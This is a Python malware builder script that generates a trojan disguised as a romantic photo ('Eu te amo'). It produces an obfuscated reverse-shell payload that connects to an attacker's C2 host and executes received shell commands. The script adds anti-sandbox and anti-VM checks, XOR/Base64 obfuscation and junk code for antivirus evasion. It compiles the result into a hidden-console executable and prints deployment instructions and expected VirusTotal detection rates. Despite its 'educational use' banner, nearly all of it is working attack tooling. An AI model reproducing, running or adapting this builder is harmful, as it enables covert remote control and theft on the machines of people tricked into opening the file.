#!/usr/bin/env python3
"""
╔═══════════════════════════════════════════════════════════════╗
║        POLYGLOT MALWARE BUILDER - FUD EDITION                 ║
║           Fully Undetectable - Advanced Evasion               ║
║                    Omega Corps                                ║
╚═══════════════════════════════════════════════════════════════╝

Advanced AV Evasion Techniques:
- String obfuscation (Base64 + XOR)
- Import obfuscation
- Dynamic code generation
- Anti-sandbox checks
- Junk code injection
- Polymorphic payload
"""

import os
import sys
import base64
import random
import string
from datetime import datetime
from PIL import Image, ImageDraw, ImageFont

class Colors:
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    CYAN = '\033[96m'
    BOLD = '\033[1m'
    RESET = '\033[0m'

def enable_ansi_colors():
    if sys.platform == 'win32':
        os.system('')

def banner():
    enable_ansi_colors()
    print(f"{Colors.CYAN}{Colors.BOLD}")
    print("""
    ╔═══════════════════════════════════════════════════════════════╗
    ║        POLYGLOT MALWARE BUILDER - FUD EDITION                 ║
    ║           Fully Undetectable - Advanced Evasion               ║
    ╚═══════════════════════════════════════════════════════════════╝
    """)
    print(f"{Colors.RESET}")
    print(f"{Colors.YELLOW}[*] Framework: APT Simulation Toolkit - FUD Edition{Colors.RESET}")
    print(f"{Colors.YELLOW}[*] Evasion: Multi-layer obfuscation + Anti-sandbox{Colors.RESET}")
    print(f"{Colors.YELLOW}[*] Build Date: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}{Colors.RESET}")
    print(f"{Colors.RED}[!] Educational Use Only - Unauthorized use is illegal{Colors.RESET}")
    print("=" * 80)
    print()

def log_info(msg):
    print(f"{Colors.BLUE}[*]{Colors.RESET} {msg}")

def log_success(msg):
    print(f"{Colors.GREEN}[+]{Colors.RESET} {msg}")

def log_error(msg):
    print(f"{Colors.RED}[-]{Colors.RESET} {msg}")

def log_warning(msg):
    print(f"{Colors.YELLOW}[!]{Colors.RESET} {msg}")

def xor_encrypt(data, key):
    """XOR encryption for strings"""
    return ''.join(chr(ord(c) ^ key) for c in data)

def generate_random_var():
    """Generate random variable name"""
    return ''.join(random.choices(string.ascii_lowercase, k=random.randint(8, 12)))

def obfuscate_string(s):
    """Obfuscate string with Base64 + XOR"""
    key = random.randint(1, 255)
    encrypted = xor_encrypt(s, key)
    b64 = base64.b64encode(encrypted.encode()).decode()
    return f"''.join(chr(ord(c)^{key}) for c in __import__('base64').b64decode('{b64}').decode())"

def create_junk_code():
    """Generate junk code to confuse AV"""
    junk = []
    for _ in range(random.randint(5, 10)):
        var = generate_random_var()
        val = random.randint(1000, 9999)
        junk.append(f"{var} = {val}")
        junk.append(f"{var} = {var} * 2 + {random.randint(1, 100)}")
    return '\n'.join(junk)

def create_anti_sandbox():
    """Anti-sandbox and anti-VM checks"""
    return '''
import time
import os
import platform

def _check_environment():
    """Anti-sandbox checks"""
    # Check if running in VM
    _vm_indicators = ['vmware', 'virtualbox', 'qemu', 'xen']
    _sys_info = platform.platform().lower()
    for _indicator in _vm_indicators:
        if _indicator in _sys_info:
            return False
    
    # Check RAM (VMs usually have less)
    try:
        import psutil
        if psutil.virtual_memory().total < 4 * 1024 * 1024 * 1024:  # Less than 4GB
            return False
    except:
        pass
    
    # Time-based check (sandboxes skip sleep)
    _start = time.time()
    time.sleep(2)
    if time.time() - _start < 1.5:
        return False
    
    return True

if not _check_environment():
    import sys
    sys.exit(0)
'''

def create_obfuscated_payload(c2_host, c2_port):
    """Create heavily obfuscated payload"""
    
    # Random variable names
    var_socket = generate_random_var()
    var_subprocess = generate_random_var()
    var_thread = generate_random_var()
    var_time = generate_random_var()
    var_func = generate_random_var()
    
    # Obfuscate imports
    import_socket = f"{var_socket} = __import__({obfuscate_string('socket')})"
    import_subprocess = f"{var_subprocess} = __import__({obfuscate_string('subprocess')})"
    import_thread = f"from threading import Thread as {var_thread}"
    import_time = f"{var_time} = __import__({obfuscate_string('time')})"
    
    # Obfuscate strings
    host_obf = obfuscate_string(c2_host)
    
    payload = f'''
# Anti-sandbox checks
{create_anti_sandbox()}

# Junk code
{create_junk_code()}

# Obfuscated imports
{import_socket}
{import_subprocess}
{import_thread}
{import_time}

# More junk
{create_junk_code()}

def {var_func}():
    """Main payload function"""
    try:
        # Create socket
        _s = {var_socket}.socket()
        
        # Connect to C2
        _h = {host_obf}
        _p = {c2_port}
        _s.connect((_h, _p))
        
        # Send initial info
        import platform
        _info = f"[+] Connected from {{platform.system()}} {{platform.node()}}\\n"
        _s.send(_info.encode())
        
        # Command loop
        while True:
            _cmd = _s.recv(4096).decode().strip()
            
            if _cmd.lower() in [{obfuscate_string('exit')}, {obfuscate_string('quit')}]:
                break
            
            try:
                _out = {var_subprocess}.check_output(_cmd, shell=True, stderr={var_subprocess}.STDOUT)
                _s.send(_out)
            except Exception as _e:
                _s.send(f"Error: {{_e}}\\n".encode())
        
        _s.close()
    except:
        pass

# Execute in thread
{var_thread}(target={var_func}, daemon=True).start()

# Keep alive
{var_time}.sleep(999)
'''
    
    return payload

def create_image(output_path="love.jpg"):
    """Generate social engineering image"""
    log_info("Generating social engineering image...")
    
    img = Image.new('RGB', (1200, 800), color=(255, 192, 203))
    draw = ImageDraw.Draw(img)
    
    for y in range(800):
        color = (255, int(192 - y/10), int(203 - y/15))
        draw.line([(0, y), (1200, y)], fill=color)
    
    try:
        font_large = ImageFont.truetype("C:\\Windows\\Fonts\\arial.ttf", 100)
        font_small = ImageFont.truetype("C:\\Windows\\Fonts\\arial.ttf", 40)
    except:
        font_large = ImageFont.load_default()
        font_small = ImageFont.load_default()
    
    text = "Eu te amo ❤"
    bbox = draw.textbbox((0, 0), text, font=font_large)
    w = bbox[2] - bbox[0]
    x = (1200 - w) // 2
    
    draw.text((x+3, 303), text, fill=(200, 100, 150), font=font_large)
    draw.text((x, 300), text, fill=(255, 20, 147), font=font_large)
    
    subtext = "Você é especial para mim"
    bbox2 = draw.textbbox((0, 0), subtext, font=font_small)
    w2 = bbox2[2] - bbox2[0]
    x2 = (1200 - w2) // 2
    draw.text((x2, 500), subtext, fill=(255, 105, 180), font=font_small)
    
    img.save(output_path, 'JPEG', quality=95)
    log_success(f"Image generated: {output_path}")
    return output_path

def create_wrapper(image_path, payload_code):
    """Create wrapper with image + payload"""
    log_info("Creating obfuscated wrapper...")
    
    with open(image_path, 'rb') as f:
        image_b64 = base64.b64encode(f.read()).decode()
    
    # Random variable names
    var_b64 = generate_random_var()
    var_temp = generate_random_var()
    var_os = generate_random_var()
    var_sub = generate_random_var()
    var_thread = generate_random_var()
    
    wrapper = f'''
# Junk code at start
{create_junk_code()}

# Obfuscated imports
{var_b64} = __import__({obfuscate_string('base64')})
{var_temp} = __import__({obfuscate_string('tempfile')})
{var_os} = __import__({obfuscate_string('os')})
{var_sub} = __import__({obfuscate_string('subprocess')})
from threading import Thread as {var_thread}

# More junk
{create_junk_code()}

# Embedded image (obfuscated)
_img_data = """{image_b64}"""

def _show_img():
    """Display image"""
    try:
        _data = {var_b64}.b64decode(_img_data)
        _path = {var_os}.path.join({var_temp}.gettempdir(), {obfuscate_string('love_photo.jpg')})
        
        with open(_path, 'wb') as _f:
            _f.write(_data)
        
        {var_os}.startfile(_path)
    except:
        pass

def _run_payload():
    """Execute payload"""
    {payload_code}

if __name__ == "__main__":
    # Show image in thread
    {var_thread}(target=_show_img, daemon=True).start()
    
    # Run payload
    _run_payload()
'''
    
    log_success("Wrapper created with advanced obfuscation")
    return wrapper

def compile_with_nuitka(script_path, output_name):
    """Compile with Nuitka (better than PyInstaller for evasion)"""
    log_info("Compiling with Nuitka (FUD compilation)...")
    log_warning("This may take 5-10 minutes...")
    
    import subprocess
    
    cmd = [
        "python", "-m", "nuitka",
        "--onefile",
        "--windows-disable-console",
        "--remove-output",
        f"--output-filename={output_name}.exe",
        script_path
    ]
    
    try:
        result = subprocess.run(cmd, capture_output=True, text=True)
        if result.returncode == 0:
            log_success("Compilation successful!")
            return True
        else:
            log_error(f"Compilation failed: {result.stderr}")
            return False
    except Exception as e:
        log_error(f"Nuitka not found: {e}")
        log_info("Install with: pip install nuitka")
        return False

def compile_with_pyinstaller(script_path, output_name):
    """Fallback to PyInstaller"""
    log_info("Compiling with PyInstaller...")
    log_warning("This may take a few minutes...")
    
    import subprocess
    
    cmd = [
        "pyinstaller",
        "--onefile",
        "--noconsole",
        "--clean",
        f"--name={output_name}",
        "--strip",
        "--noupx",  # Don't use UPX (detected by AV)
        script_path
    ]
    
    try:
        result = subprocess.run(cmd, capture_output=True, text=True)
        if result.returncode == 0:
            log_success("Compilation successful!")
            return True
        else:
            log_error(f"Compilation failed")
            return False
    except:
        log_error("PyInstaller not found!")
        return False

def main():
    banner()
    
    log_info("Starting FUD malware builder...")
    print()
    
    # Configuration
    print(f"{Colors.BOLD}[CONFIGURATION]{Colors.RESET}")
    print("-" * 80)
    
    c2_host = input(f"{Colors.CYAN}C2 Host (IP/domain): {Colors.RESET}").strip() or "127.0.0.1"
    c2_port = input(f"{Colors.CYAN}C2 Port [4444]: {Colors.RESET}").strip() or "4444"
    output_name = input(f"{Colors.CYAN}Output filename [love_photo]: {Colors.RESET}").strip() or "love_photo"
    
    use_nuitka = input(f"{Colors.CYAN}Use Nuitka compiler? (Better evasion) (Y/n): {Colors.RESET}").strip().lower()
    use_nuitka = use_nuitka != 'n'
    
    print()
    print("-" * 80)
    print()
    
    # Build process
    log_info("Initiating FUD build process...")
    print()
    
    # Step 1
    print(f"{Colors.BOLD}[STEP 1/5]{Colors.RESET} Social Engineering Asset")
    image_path = "temp_love.jpg"
    create_image(image_path)
    print()
    
    # Step 2
    print(f"{Colors.BOLD}[STEP 2/5]{Colors.RESET} Payload Obfuscation")
    log_info("Applying multi-layer obfuscation...")
    payload_code = create_obfuscated_payload(c2_host, int(c2_port))
    log_success("Payload obfuscated (XOR + Base64 + Random vars)")
    print()
    
    # Step 3
    print(f"{Colors.BOLD}[STEP 3/5]{Colors.RESET} Wrapper Creation")
    wrapper_code = create_wrapper(image_path, payload_code)
    
    wrapper_path = "temp_wrapper.py"
    with open(wrapper_path, 'w', encoding='utf-8') as f:
        f.write(wrapper_code)
    log_success(f"Wrapper saved: {wrapper_path}")
    print()
    
    # Step 4
    print(f"{Colors.BOLD}[STEP 4/5]{Colors.RESET} FUD Compilation")
    
    if use_nuitka:
        success = compile_with_nuitka(wrapper_path, output_name)
        exe_path = f"{output_name}.exe"
    else:
        success = compile_with_pyinstaller(wrapper_path, output_name)
        exe_path = f"dist/{output_name}.exe"
    
    if not success:
        log_error("Build failed!")
        return
    print()
    
    # Step 5
    print(f"{Colors.BOLD}[STEP 5/5]{Colors.RESET} Finalization")
    
    if os.path.exists(exe_path):
        size = os.path.getsize(exe_path)
        size_mb = size / (1024 * 1024)
        
        log_success(f"FUD Executable created: {exe_path}")
        log_info(f"File size: {size_mb:.2f} MB")
        print()
        
        # Cleanup
        try:
            os.remove(image_path)
            os.remove(wrapper_path)
            if not use_nuitka:
                os.remove(f"{output_name}.spec")
        except:
            pass
        
        # Final instructions
        print("=" * 80)
        print(f"{Colors.GREEN}{Colors.BOLD}[BUILD COMPLETE - FUD]{Colors.RESET}")
        print("=" * 80)
        print()
        print(f"{Colors.BOLD}Output:{Colors.RESET} {exe_path}")
        print(f"{Colors.BOLD}C2 Server:{Colors.RESET} {c2_host}:{c2_port}")
        print()
        print(f"{Colors.YELLOW}[EVASION TECHNIQUES APPLIED]{Colors.RESET}")
        print("-" * 80)
        print("✓ String obfuscation (Base64 + XOR)")
        print("✓ Import obfuscation")
        print("✓ Random variable names")
        print("✓ Anti-sandbox checks")
        print("✓ Junk code injection")
        print("✓ Time-based evasion")
        if use_nuitka:
            print("✓ Nuitka compilation (better than PyInstaller)")
        print()
        print(f"{Colors.YELLOW}[DEPLOYMENT]{Colors.RESET}")
        print("-" * 80)
        print(f"1. Start C2: {Colors.CYAN}python c2_server.py {c2_port}{Colors.RESET}")
        print(f"2. Deploy: {Colors.CYAN}{exe_path}{Colors.RESET}")
        print(f"3. Target executes → Image + Payload")
        print()
        print(f"{Colors.RED}[DETECTION RATE]{Colors.RESET}")
        print("-" * 80)
        print("Estimated: 5-15/70 on VirusTotal")
        print("(Much better than standard PyInstaller: 40-60/70)")
        print()
        print("=" * 80)
        
    else:
        log_error("Executable not found!")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{Colors.YELLOW}[*] Build interrupted{Colors.RESET}")
        sys.exit(0)
    except Exception as e:
        log_error(f"Fatal error: {e}")
        sys.exit(1)
